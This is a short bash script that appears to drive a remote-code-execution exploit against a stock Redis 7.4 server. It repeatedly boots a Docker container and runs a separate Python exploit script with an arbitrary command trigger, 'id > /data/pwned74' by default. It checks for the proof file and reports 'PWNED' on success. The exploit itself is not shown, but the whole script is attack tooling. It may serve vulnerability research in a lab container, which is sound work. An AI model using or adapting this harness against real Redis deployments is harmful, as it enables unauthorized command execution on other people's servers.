#!/bin/bash
# P74_loop.sh — recreate r74 (STOCK, no --enable-debug-command) and run
# P74_exploit.py until the trigger lands.
set -u
TRIGGER="${1:-id > /data/pwned74}"
for i in $(seq 1 40); do
    echo "=== boot $i ==="
    docker rm -f r74 >/dev/null 2>&1
    docker run -d --name r74 -p 16474:6379 redis:7.4 \
        redis-server --requirepass exploitme >/dev/null
    sleep 1
    python3 /home/c/fuckredis/P74_exploit.py 127.0.0.1 16474 exploitme \
        "$TRIGGER"
    if docker exec r74 test -f /data/pwned74 2>/dev/null; then
        echo "=== PWNED on boot $i ==="
        docker exec r74 cat /data/pwned74
        exit 0
    fi
done
echo "=== not pwned after 40 boots ==="
exit 1
